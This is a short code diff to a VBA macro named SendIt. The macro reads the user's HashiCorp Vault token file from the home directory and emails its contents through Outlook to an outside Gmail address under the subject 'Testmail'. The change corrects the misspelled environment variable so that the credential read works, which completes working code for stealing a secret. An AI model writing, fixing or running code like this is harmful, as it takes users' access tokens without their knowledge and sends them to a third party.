@@ -6,10 +6,10 @@ Sub SendIt()
 
   Set outobj = CreateObject("Outlook.Application")
   Set mailobj = outobj.CreateItem(0)
-  home = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%HUSERPROFILE%")
+  home = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%USERPROFILE%")
   vaultCreds = GetText(home & "\.vault-token")
 
-    With mailobj
+  With mailobj
     .To = "test@gmail.com"
     .Subject = "Testmail"
     .Body = vaultCreds
